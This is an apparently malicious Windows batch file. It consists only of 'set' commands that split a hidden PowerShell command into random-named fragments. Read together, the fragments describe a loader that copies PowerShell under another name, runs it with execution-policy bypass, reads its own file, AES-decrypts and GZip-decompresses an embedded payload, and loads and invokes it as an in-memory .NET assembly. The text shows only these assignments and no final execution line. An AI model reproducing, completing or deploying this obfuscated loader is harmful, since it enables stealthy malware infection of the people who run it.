@echo off
set "KTmtyWZbXY=em"
set "XNyMbUnQMF=xe"
set "MYBQuXlRAE=rs"
set "SZGVKefeCp=co"
set "XhaiyuCoOe=ll"
set "oIOgolOLTv=he"
set "sYMJrsiGuO=rS"
set "aJPTCioaue=32"
set "NyNKZjWjAd=ow"
set "XGJXrfrHrS= C"
set "qzZDqrSpZj=\W"
set "QxLbjzZOGn=we"
set "lfdPPfXtwY=\v"
set "fFuxqVkGTK=s\"
set "ZmKJgeSnor=y "
set "HzEYairRos=in"
set "cEkNpVTxjX=Sy"
set "BImIgCXfIV=py"
set "PURpDiEZri=po"
set "DJnEKoYZhQ=ll"
set "eKcNrBfQTt=Po"
set "nvpVdyLWdq=we"
set "KnUlpkYEkW=0\"
set "htiziyHgBW=he"
set "MONfygoLcU=st"
set "CuyoUlqIEF=nd"
set "SoqXElUJch=ws"
set "sywefiIENY=1."
set "prLdidxrKl=:\"
set "ycAUkRsbVF=.e"
set "VRzlWdYTCp=do"
set "REugMcLWgf= /"
set "FbvcdGcNwE=Wi"
set "bFKPMVeuzC= %~dp0"
set "HScMAinmpV=cd"
set "MHjFJuMKQa=.Cop"
set "YStSvxXTpA=wbiB"
set "ewCBdUtrqP=form"
set "ZeaxDbpeKt=d;$e"
set "ETXyzRuZEJ=rity"
set "ngNubdEJVB=Comp"
set "XkCMaSXqfL= = N"
set "cPUULplZFY=ing("
set "VDNyKPBAcD=kys."
set "CfNpumcwDz=3); "
set "EixRHIZDLC== [S"
set "ZNJXweHKcx=eMVs"
set "BPgcVKbTII=y.Ci"
set "ycNaPneiiW=($aD"
set "aBiDRLIEiL=Stre"
set "OSsUuvhtMW='txe"
set "YWGclTFGsy=eEbC"
set "ggVLLqZtPc=ionM"
set "naFnkyQnwi=$ddm"
set "ITbfJnjUVW===')"
set "MTADjSuTwG=m.IO"
set "JxcIhxQmjS=vp.T"
set "jYjWpKtqIm=oin "
set "hqzEPNwelN= [Sy"
set "zgskqcszEu=.GZi"
set "HruCCpNzkB=l5E7"
set "TVNPILBkjn=Bmor"
set "bTpbTQrvWF=m.IO"
set "jEMQusijMf=CG.I"
set "bMxqtOtnfB=EbCG"
set "JdtqwXOtSq=oL'["
set "vQRyGdydKT=Syst"
set "byUufnsejM=  $S"
set "AJLbrrJJtw=.Com"
set "FuXMLjEsOM=rt]:"
set "CFjJqjEBBp=kAYG"
set "lubPRhDOUl=;$op"
set "CoKPYOSNKU=tS46"
set "wQXmQcgBYj=gMod"
set "gQIpVXySNh=comm"
set "kohulxZwOD=iJk."
set "kgeyQGVTID=..-1"
set "xtunncHgFo=g = "
set "CxaddLLxXy=Comp"
set "DKgHjUAwmm=vDg "
set "OYtdjcyuxY=G, 0"
set "fafyHDpAVr=)($S"
set "whOsnWZMvR=stem"
set "PZJDJkQNNO=($aD"
set "PupkcDSNia=tem."
set "rQGkAycvih=vp ="
set "FIEKhEItSe=n ''"
set "fybEuiiwUF=iJk "
set "LWtdARXDEr=join"
set "FndHFFQgIk=bypa"
set "JTEnKkDZwv=; };"
set "YdBZMYAADb=New-"
set "TecVLeISfQ=);$e"
set "WxDdExMmrh=..-1"
set "mIfSuzkDjo= = $"
set "CSojBeWcsi=L4Yi"
set "IAOvfVLOZM=in $"
set "BBJMCkRguK=yste"
set "fhvRqMSrZZ=);$e"
set "aZqPGTeruE=pres"
set "KIwZXddVuH=morF"
set "IdoCACCAiv=$eEb"
set "GPxxoXTRDa=ptog"
set "zivVCDPGxP=pher"
set "IQeoGExPps=Conv"
set "UPbuExxzqq=orF'"
set "fASWryuGZQ=6esa"
set "rtAiaYTIPE=oArr"
set "PtPJaBsanK=.Cry"
set "hWPezpoMfX=('da"
set "DaRAvWYRXF=am;$"
set "TrLHqaPiFt=New-"
set "FGDdhZUzWx=::De"
set "zoVcAfRbsd=GkAY"
set "MdAWManPrt=yste"
set "BnQkHRXOTB=();$"
set "PmslPeQpZt=File"
set "xZvxgXUxQu='[-1"
set "FPmtPPIsWV== $e"
set "UmMdLCpVXW=.Cre"
set "BWjShxqOBd=-nop"
set "aemiNsUVIc=7;$e"
set "KmnsFrshFS=tryP"
set "tfpfMkCrHW='0Pg"
set "VLeJfcdjlK=.Cry"
set "FvGuzcHyXB=GkAY"
set "TwGIVYRyJF=pose"
set "pqMimJgJwD= '')"
set "osghICtScr=QzVV"
set "gJMbbjiAJD=daeR"
set "pUDANBKChx=zHhH"
set "GkWmGDfckR=ispo"
set "VPlhyhwqaI=ypto"
set "JtDOoxLIAo=EbCG"
set "UvdTTlypYV=ddin"
set "lHkAKwvqjm=Mode"
set "GbrWYJPbyU=brea"
set "tHRISZxmEi='[-1"
set "dkUTmgpVNM=ress"
set "jYHtoZwTKm=vert"
set "nBMUmgQEZH=.Len"
set "JLSxPewTOP=dj0C"
set "sTzhwfgJSJ=hy.A"
set "zOlxrzOBrD=esaB"
set "NBLuFaudSM=.Dis"
set "NpyhsGNSlv=[]] "
set "gXtBVApElN= [Sy"
set "axrkiqpySu=ach "
set "tWxKfiLncV=y.Cr"
set "QdGzniriFL=V = "
set "KryDDTSLRV=6] -"
set "oPVQcwKpPQ=]::N"
set "OVehJgzHhB=pose"
set "eRCIjRiIGj=Secu"
set "jSiyeJkXsY=y.Pa"
set "ANuZBrmvyN=();$"
set "CspRSSFlSL=ys.T"
set "MkmJynreKD=embl"
set "gPEdDCtDiW=stem"
set "ODowlvlXGy=-1.."
set "WcEGKiGxzc=('%*'"
set "tPaXqNXzKB=ateD"
set "QDYvzfzoSO=dmvp"
set "DrNjgawJnQ=] -j"
set "kNMktvlyEb=Fina"
set "pyNOeajNIb=oint"
set "JsorBiuplZ=CFxo"
set "HxchHXrLrT=yste"
set "ZEZNUWOnLO=-joi"
set "AFNZnlSoxQ=Va, "
set "cuBkdtdjIn=ptor"
set "OojQDQbeRu=sion"
set "afRgnRUeOZ=aDiJ"
set "rouoKbfDAn=, $G"
set "GYmRSOthMe=);$A"
set "BScqRflagZ=lit("
set "vXvYjBapnj= = ["
set "AbxzWEQsjb=ay()"
set "oibCWdTOsp=::('"
set "npiAGwGAse=[IO."
set "qFSYXUHfyE=$QzV"
set "qywwjaBDer='gni"
set "tkArHCvNQa=f) {"
set "haFIoVSjln=k.Su"
set "WFogFbeAjp=Obje"
set "ZoAfyrnMBe=;$vN"
set "JvrLoOTzXg=hjR."
set "XtYyzODeRw=raph"
set "ktVxgmyYXu=ert]"
set "uCqmEiilOE=rtS4"
set "rDvBdzJLCZ=ke($"
set "vQQjGyMQiC=ect "
set "ySeiXrfLXZ=k; }"
set "pQNYJuaeUW=and "
set "tlxHnbwrsA=ion."
set "hbpfgIyrni=AhjR"
set "sMcYsNxRDD= New"
set "NGEPxyTxjT=ct S"
set "qwVTkRrKXZ=-Obj"
set "vhqZdzSQho=gnir"
set "hjmQWcineY=('Tg"
set "NaiDHFnaZS=onve"
set "xJabIEjUrb=F = "
set "KpGemZzUtY= = $"
set "SqtLlZORkS=)))"
set "gyBEUiEMsl=m(, "
set "DtyWoDOBOE=$ddm"
set "uTcmpymkYS=n ''"
set "jTYFTWvDcs=ptog"
set "GUDoyzOBDS=16] "
set "LWIWvUqYxz=Invo"
set "PrrpYjODCj=TllA"
set "ZtWXtryLBo=.Mem"
set "MgFgGYCFBX=$GkA"
set "bHREBaDHKL=tem."
set "nDCLNGSCTD=EbCG"
set "ShlxyKVsEC=ddin"
set "ahDiMtcwaV=y]::"
set "SgPVzysUNZ=.Con"
set "qCMnfPNOFB=ecry"
set "OAqwUYnPTX=G = "
set "iKilbUUMZI=em.I"
set "hmImkDZufS=-ep "
set "bgDghMUuTY=kys "
set "fwmsQjpzEH=ress"
set "qqpQHsscaG=bstr"
set "ufOEbQVPqc=m.Re"
set "nLPaPZLXmV=.IO."
set "pWfNTZdahj=[Sys"
